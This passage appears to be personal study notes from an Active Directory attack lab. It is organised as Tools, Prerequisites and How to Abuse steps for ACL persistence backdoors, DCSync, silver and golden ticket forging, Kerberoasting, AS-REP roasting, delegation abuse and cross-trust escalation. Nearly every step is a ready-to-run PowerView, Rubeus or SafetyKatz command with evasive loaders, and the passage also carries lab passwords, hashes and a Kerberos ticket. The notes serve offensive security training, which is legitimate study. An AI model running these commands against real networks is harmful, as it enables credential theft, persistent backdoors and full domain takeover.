> -PrincipalIdentity: The user we want to add permission for 
3. Manually trigger propagation 
```
$sess = New-PSSession -ComputerName dcorp-dc 
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-SDPropagator.ps1
Invoke-Command -ScriptBlock {Invoke-SDPropagator -showProgress -Verbose -timeoutMinutes 1} -Session $sess
```
```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose 
```
4. This would cause the { PrincipalIdentity } to be granted FullControl over the ACL for protected groups
5. That principle identity user could then add/remove users (including themselves) into the protected groups, including into the Domain Admins group
* Elevated cmd
```
net group "Domain Admins" student844 /add /domain
```
* PowerView
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members student844 -Verbose 
```
6. The user can then access the DC using their username and password
```
winrs -r:DCORP-DC -u:student844 -p:WDyV3L6Sr3xPRgdp cmd
```
> Kerberos authentication won't work 
    
<h1>Persistence - Using ACLs: Rights Abuse</h1>

<h2>Tools</h2>

1. Invoke-SDPropagator --> manually trigger propagation
> Overwriting SDProp to the ACLs of protected groups (including Domain Admins group) 
2. PowerView --> change the SDProp
3. RACE toolkit --> change the SDProp 

<h2>Prerequisites</h2>

1. DA privileges (process running as DA) 

<h2>What We Can Do With It</h2>
    
1. Add Full Control (GenericAll) rights over DC
> DC distinguished name: "DC=dollarcorp,DC=moneycorp,DC=local" 
2. Add DCSync Rights on a DC
3. Once we get DCSync rights, execute a DCSync attack and get the krbtgt account hash. 
4. Then we can use the krbtgt hash to create Golden Tickets 

<h2>How to Abuse</h2>

1. Add DCSync rights to student844 
```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student844 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
> Run this command on a process with DA privileges 
2. Check if the right is applied 
```
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student844"} 
```
> DCSync requires two rights: 
> * Replicating Directory Changes
> * Replicating Directory Changes All
3. Execute DCSync attack using student844 privileges 
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Safetykatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<h1>Persistence - Using ACLs: Security Descriptors (WMI)</h1>

<h2>Tools</h2>

1. RACE toolkit --> change the DCOM endpoint and WMI namespaces 

<h2>Prerequisites</h2>

1. DA privileges (process running as DA) --> for DC
2. Admin access on the target machine 

<h2>What We Can Do With It</h2>

1. WMI to the target computer

<h2>How to Abuse</h2>
    
1. Setting up the persistence
```
Set-RemoteWMI -SamAccountName student844 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
> If namespace is not specified, it defaults to root 
> The ACL will be exactly the same as built-in Administrator, just modifying the SID in the security descriptor to the SID we specified (user we control) 
2. Access the target computer using WMI 
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```
> Enters as a normal user, cannot do DCSync, read credentials from SAM Hive, etc that requires DA privileges

<h1>Persistence - Using ACLs: Security Descriptors (PowerShell Remoting)</h1>

<h2>Tools</h2>

1. RACE toolkit --> changes the PS Session configuration

<h2>Prerequisites</h2>

1. DA privileges (process running as DA) --> for DC
2. Admin access on the target machine 

<h2>What We Can Do With It</h2>

1. Enter-PSSession to the target computer

<h2>How to Abuse</h2>
    
1. Setting up the persistence
```
Set-RemotePSRemoting -SamAccountName student844 -ComputerName dcorp-dc -Verbose
```
> This error can be ignored: The I/O
operation has been aborted because of either a thread exit or an application request.
2. Access the target computer using Enter-PSSession 
```
Enter-PSSession dcorp-dc
```
> Enters as a normal user, cannot do DCSync, read credentials from SAM Hive, etc that requires DA privileges
3. What to do next: privilege escalation (WinPEAS, PrivEsc, PowerUp) 

<h1>Persistence - Using ACLs: Security Descriptors (Remote Registry)</h1>

<h2>Tools</h2>

1. RACE toolkit --> retrieves the machine account, local account hash, and cached credentials

<h2>Prerequisites</h2>

1. DA privileges on DC (process running as DA on the DC) --> for DC
2. Admin access on the target machine and foothold (idk why but other machines dont work) 

<h2>What We Can Do With It</h2>

1. Retrieve machine account hash and create a silver ticket for it
2. If it is the DC, we can create a silver ticket that provides us access to any of the resources

<h2>How to Abuse</h2>
    
1. On the target machine, add remote registry backdoor
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student844 -Verbose
```
2. As the user we control (student844), retrieve the machine account hash (dcorp-dc in this case)
```
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose 
```
> For DCORP-DC: 15ab5a5855e3468b7edb062d2ba6fbe2
3. Proceed to forge a silver ticket 
* HOST and RPCSS for WMI
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:15ab5a5855e3468b7edb062d2ba6fbe2 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:15ab5a5855e3468b7edb062d2ba6fbe2 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
```
gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
```
* HTTP for winrs
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:15ab5a5855e3468b7edb062d2ba6fbe2 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
```
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
```

<h1>Domain Priv Esc - Kerberoasting</h1>

<h2>Tools</h2>

1. To enumerate: Powerview, ADModule, Rubeus

<h2>Prerequisites</h2>

1. User account that has non-null SPN 
```
Get-DomainUser -SPN
```
2. Target account must support RC4 

<h2>What We Can Do With It</h2>

1. Get the user account's password
2. Access resources using the plaintext credentials (winrs, runas)

<h2>How to Abuse</h2>
    
1. Check if there are any kerberoastable users (user count) 
```
c:\ad\tools\loader.exe -path c:\ad\tools\rubeus.exe -args kerberoast /stats
```
2. Find the kerberoastable user accounts 
```
Get-DomainUser -SPN
```
> No point looking at krbtgt
> If any user exists, we can request a service ticket for the user accounts to brute force offline 
> Do not run kerberoast on all users 
3. Get the hash for the users (kerberoast users one by one) 
```
c:\ad\tools\loader.exe -path c:\ad\tools\rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt 
```
4. Throw the hash to John The Ripper, remove the colon and port 
```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
5. Login to svcadmin
```
winrs -r:DCORP-DC -u:svcadmin -p:*ThisisBlasphemyThisisMadness!! cmd
runas /user:dcorp\svcadmin /netonly cmd
```

<h1>Domain Priv Esc - Targeted Kerberoasting - AS-REPs</h1>

<h2>Tools</h2>

1. To enumerate: Powerview, ADModule, Rubeus

<h2>Prerequisites</h2>

1. User account that has Kerberos pre-auth disabled
or
2. GenericAll or GenericWrite over a user/group (Find-InterestingDomainAcl) 
    > To disable preauth to them (so it can be AS-REP Kerberoasted) 

<h2>What We Can Do With It</h2>

1. Get the plain text password of this account through brute forcing 
2. Access resources using the plaintext credentials (winrs, runas)

<h2>How to Abuse</h2>

1. Find out the users that has preauth disabled 
```
Get-DomainUser -PreauthNotRequired -Verbose 
```
2. Get the hash for the users 
```
c:\ad\tools\loader.exe -path c:\ad\tools\rubeus.exe -args asreproast /user:VPN844user /simple /rc4opsec /outfile:C:\AD\Tools\hashesvpn.txt 
```
3. Crack the has offline, if the user is valuable, access resources using their credentials 
    
If pre-auth is not disabled: 
1. Force disable Kerberos preauth 
```
set-domainobject -identity support844user -xor @{useraccountcontrol=4194304} -verbose
```
> 4194304: DONT_REQ_PREAUTH
> https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties 

Before setting preauth
![image](https://hackmd.io/_uploads/HkWYADZsJl.png)

After setting preauth 
![image](https://hackmd.io/_uploads/Hyj3AvWj1x.png)

If an account is not AS-REP roastable 
![image](https://hackmd.io/_uploads/H1BhydWoyg.png)

<h1>Domain Priv Esc - Targeted Kerberoasting - Set SPN</h1>

<h2>Tools</h2>

1. To enumerate: Powerview, ADModule, Rubeus

<h2>Prerequisites</h2>

1. GenericAll or GenericWrite over a user 
    > To add SPN to them (to configure it as a service account so it can be Kerberoasted) 

<h2>What We Can Do With It</h2>

1. Kerberoast the account and brute force the password 
2. Access resources using the plaintext credentials (winrs, runas)

<h2>How to Abuse</h2>
    
1. Set a serviceprincipalname for a user we have GenericAll/GenericWrite access to 
```
set-domainobject -identity support844user -set @{serviceprincipalname='dcorp/whatever'}
```
2. check if the SPN applies
```
get-domainuser -identity "support844user"
```
![image](https://hackmd.io/_uploads/H19HHd-o1g.png)
3. Kerberoast the targeted user 
```
c:\ad\tools\loader.exe -path c:\ad\tools\rubeus.exe -args kerberoast /user:support844user /simple /rc4opsec /outfile:C:\AD\Tools\hashessupport.txt 
```

<h1>Domain Priv Esc - Unconstrained Delegation</h1>

<h2>Tools</h2>
 
1. SafetyKatz, Rubeus, Loader, HFS, MS-RPRN.exe 

<h2>Prerequisites</h2>

1. A computer with unconstrained delegation 
```
Get-DomainComputer -UnConstrained 
```
2. A user with admin access on the first hop (to set up Rubeus Monitor Mode) 
```
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```
3. Print spooler (default), Windows Search, or DFS namespaces service running on the target (first hop) 

<h2>What We Can Do With It</h2>

1. Steal user's credentials (DA or EA, the one we force to connect to the first hop) 
2. Use the user's credentials (in this case DC's machine account hash) to run DCSync

<h2>How to Abuse</h2>

1. Enumeration: Find computers with unconstrained delegation
```
Get-DomainComputer -Unconstrained
```
2. Find domain users who has local admin access to the first hop computer
OPTH to the users that we can OPTH to and run Find-PSRemotingLocalAdminAccess 
```
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```
3. Use the domain user's credentials to access the machine and copy necessary tools, set up port forwarding if needed 
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-appsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.44 
```
4. Set up listener on the first hop machine
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
5. On an elevated student process, force DC to connect to the first hop machine
```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
6. Steal DC machine account's TGT and inject it to the current process
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPT... 
```
7. Execute a DCSync attack 
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
8. Get krbtgt credentials –> Create golden/diamond tickets as Administrator (or any user) to access any resources in the domain
    

<h1>Domain Priv Esc - Constrained Delegation with Protocol Transition</h1>

<h2>Tools</h2>
 
1. SafetyKatz, Rubeus, Loader, HFS, MS-RPRN.exe 

<h2>Prerequisites</h2>

1. A user or computer with constrained delegation 
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth 
```
> TRUSTED_TO_AUTH_FOR_DELEGATION
> msDS-AllowedToDelegateTo --> second hop (to be compromised)
2. Access to the first hop as its local admin
3. The impersonated user must already have privilege to access the second hop 
> Just do Domain Administrator
4. If the machine in the msDS-AllowedToDelegateTo is high-impact, make sure to compromise it (can set altservice)

<h2>What We Can Do With It</h2>

1. If I compromise the first hop user (first enumeration command), then I will be able to access the services listed on MsDS-AllowedToDelegateTo as any user including Domain Admin 
2. If we have GenericWrite/GenericAll on the first hop, we can modify the msDS-AllowedToDelegateTo to access any services (that we modified) 

<h2>How to Abuse</h2>
    
1. Find users who has a constrained delegation and find out the target service
```
Get-DomainUser -TrustedToAuth
```
2. Compromise the user (first hop) if not already
3. Impersonate a DA, request a forwardable ticket and inject the service ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
4. Access the service as the impersonated user 
```
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```
5. If it is a high-impact machine in the msDS-AllowedToDelegateTo, change the service using altservice
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```
> When picking the hash for a machine account, look at the SID
> Make sure to pick AES, RC4 hash value are the same 
> Pick the one that has SID: S-1-5-18 --> A special account used by the operating system. --> Well-known SID for SYSTEM (system account is the machine account for the domain)
> The SYSTEM account is the highest privilege level in the Windows user model. It exists to provide ownership to objects that are created before a normal user logs on, such as the Local Security Authority Subsystem (LSASS) and the Session Management Subsystem (SMSS).
6. If we get access to high-privilege machine (such as DC), we can run DCSync. 
    
    
<h1>Domain Priv Esc - Resource-based Constrained Delegation</h1>

<h2>Tools</h2>
 
1. PowerView
2. ADModule
3. Rubeus
4. SafetyKatz 

<h2>Prerequisites</h2>

1. Admin access on domain-joined machine (our student machine, foothold on it) 
2. A compromised user who has GenericAll/GenericWrite over a machine (PowerView or BloodHound) 
```
Find-InterestingDomainACL | ?{$_.identityreferencename -match '<username>}
Find-InterestingDomainACL | ?{$_.objectdn -match 'dcorp-mgmt'}
```
> To configure RBCD on the target computer for computers that we have foothold on 

<h2>What We Can Do With It</h2>

1. Use the credentials of the machine account we have foothold on to access the target machine that we set RBCD for

<h2>How to Abuse</h2>
    
1. Find out if a user we compromised has a GenericAll/GenericWrite over a computer 
```
Find-InterestingDomainACL or BloodHound 
```
2. Using the account that has write privileges (ciadmin in this case), OPTH, configure RBCD on the target machine using ciadmin's privilege, for the computer(s) we have foothold on (std844 in this case) 
```
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount dcorp-std844$ 
```
```
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std844$' -Verbose 
```
> ADModule
3. Extract the credentials of the machine we have foothold on (AES256)
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Safetykatz.exe -args "sekurlsa::evasive-keys" "exit"
```
> Remember to get the one with the SID: S-1-5-18
4. Use the extracted credentials to access the target machine (the one we set RBCD for) using the machine account of the machine we have foothold on 
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std844$ /aes256:0c828d8c030febb37bf64b000ebcb8a982da2fa3f6577f92f0fffce576cf9d14 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```
5. Access the service
```
winrs -r:dcorp-mgmt.dollarcorp.moneycorp.local cmd 
```
    
<h1>Enterprise Priv Esc - Trust Key Abuse (Forging an inter-realm TGT)</h1>

<h2>Tools</h2>
 
1. SafetyKatz
2. Rubeus 

<h2>Prerequisites</h2>

1. Domain Admin privileges --> to extract trust key from DC 
2. Trust key (NTLM hash) --> extract from DC of current domain
3. Implicit trust, relationship (parent-child domain) 
    
<h2>What We Can Do With It</h2>

1. Forge inter-realm TGT
2. Ask TGS for the parent root domain services using the forged TGT
3. Access resources on the parent root domain
    
<h2>How to Abuse</h2>
    
1. Access current domain's DC (OPTH and winrs to it) and extract credentials (trust key) from there. 
* Evasive Trust
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
* DCSync on MCORP
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit" 
```
* Extract all credentials from the DC
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit" 
```
2. Get Enterprise Admins group's SID
```
get-domaingroup -identity "enterprise admins" -domain moneycorp.local
```
> S-1-5-21-335606122-960912869-3279953914
3. Forge an inter-realm TGT with the trust key using the silver module
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:a7e7456ce923d115298ecb27eae9eeff /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```
*rc4: trust key hash*
*SID: domain's sid*
*SIDS: Enterprise Admins group's SID*
> to access krbtgt service for the current domain using parent's SID (SIDS)
4. AskTGS to OPTH, inject the TGS to the current process to access MCORP-DC's HTTP
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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
```
5. Access MCORP-DC using winrs
```
winrs -r:mcorp-dc.moneycorp.local cmd 
```
> As admin of DOLLARCORP, access MCORP-DC 
    
<h1>Enterprise Priv Esc - As Administrator of child domain: krbtgt Secret Abuse (Forging a Golden Ticket)</h1>

<h2>Tools</h2>
 
1. SafetyKatz
2. Rubeus 

<h2>Prerequisites</h2>

1. Domain Admin privileges --> to extract current krbtgt key from DC 
2. Parent root domain SID History 
3. Implicit trust, relationship (parent-child domain) 
    
<h2>What We Can Do With It</h2>

1. Forge a golden ticket and inject
2. Access resources on the parent root domain as a CHILD DOMAIN ADMINISTRATOR 

<h2>How to Abuse</h2>
    
1. Forge a golden ticket and directly inject it to the process
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /domain:dollarcorp.moneycorp.local /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /id:500 /netbios:dcorp /user:Administrator /ptt
```
> * aes256: krbtgt hash of the current domain
> * sid: SID of the current domain 
> * sids: SID history of the parent domain
2. We can then access any resources on any machines on the parent-root domain. No need to request service ticket again. 
    
    
<h1>Enterprise Priv Esc - As DC of child domain: krbtgt Secret Abuse (Forging a Golden Ticket)</h1>  

<h2>Tools</h2>
 
1. SafetyKatz
2. Rubeus 

<h2>Prerequisites</h2>

1. Domain Admin privileges --> to extract current krbtgt key from DC 
2. Current domain's krbtgt hash
3. Current domain's SID
4. Parent domain's Domain Controllers Group's SID
```
get-domaingroup -identity "Domain Controllers" -domain moneycorp.local
```
5. Enterprise Administrator group SID
6. Implicit trust, relationship (parent-child domain) 
    
<h2>What We Can Do With It</h2>

1. Forge a golden ticket for DCORP-DC$ and inject it to the process
2. We will then gain DC privilege
3. We can leverage the DC privilege to DCSync with MCORP-DC

<h2>How to Abuse</h2>

1. Forge a golden ticket and inject
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:dcorp-dc.dollarcorp.moneycorp.local /ptt
```
> * aes256: DCORP's krbtgt hash
> * sid: dollarcorp's SID
> * sids: parent domain's Domain Controllers group SID, Enterprise Admins group SID
2. Execute a DCSync with MCORP-DC, but cannot winrs to MCORP-DC
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```
> MCORP's krbtgt hash: 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e
3. Forge a Golden ticket to access MCORP-DC as Enterprise Admin
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /sid:S-1-5-21-335606122-960912869-3279953914 /ldap /user:moneycorp.local\Administrator /printcmd /domain:moneycorp.local
```
> aes256: mcorp's krbtgt
> sid: parent domain SID
4. Inject the Golden Ticket
```
C:\AD\Tools\Loader.exe -path c:\ad\tools\rubeus.exe -args Evasive-Golden /aes256:90EC02CC0396DE7E08C7D5A163C21FD59FCB9F8163254F9775FC2604B9AEDB5E /user:Administrator /id:500 /pgid:513 /domain:moneycorp.local /sid:S-1-5-21-335606122-960912869-3279953914 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:153 /netbios:mcorp /groups:544,512,520,513 /dc:MCORP-DC.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```
5. Winrs to MCORP-DC now works
```
winrs -r:mcorp-dc.moneycorp.local cmd
```
    
<h1>Enterprise Priv Esc - Across External Trust</h1>

<h2>Tools</h2>
 
1. SafetyKatz
2. Rubeus 

<h2>Prerequisites</h2>

1. Domain Admin or Enterprise Admin privileges --> to extract current krbtgt key of across-trust DC
2. Trust Key
3. SID of the current domain  
    
<h2>What We Can Do With It</h2>
    
1. Access the explicitly shared resources using a user that has this privilege
2. Knowledge on what resource is explicitly shared 
* How to list the shares 
> net view \\eurocorp-dc.eurocorp.local\ 
> Whether we can access it or not, need to try one by one (noisy) 
    

<h2>How to Abuse</h2>

1. Extract the krbtgt hash of the across-trust domain
* Evasive Trust
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
> * aes256_hmac       4b80616438da05375b28617ada33b810188d218e93ccdeb7b4951d0426a9615c
> * aes128_hmac       07fa03627ca97e029d9696f0efbe09ba
> * rc4_hmac_nt       b0eb0461bc6e9b9dc65466926891c335
* DCSync on ECORP
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\ecorp$" "exit" 
```
> b0eb0461bc6e9b9dc65466926891c335
> SID: S-1-5-21-719815819-3726368948-3917688648-1112 (not gonna be used) 
* Extract all credentials from the DC
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit" 
```
> b0eb0461bc6e9b9dc65466926891c335
2. Forge an inter-realm TGT using the trust key for the external trust      
```  
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:b0eb0461bc6e9b9dc65466926891c335 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```
> *rc4: trust key hash*
> *SID: domain's sid*
3. AskTGS to OPTH, inject the TGS to the current process to access EUROCORP-DC's HTTP
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.EUROCORP.LOCAL /dc:eurocorp-dc.EUROCORP.LOCAL /ptt 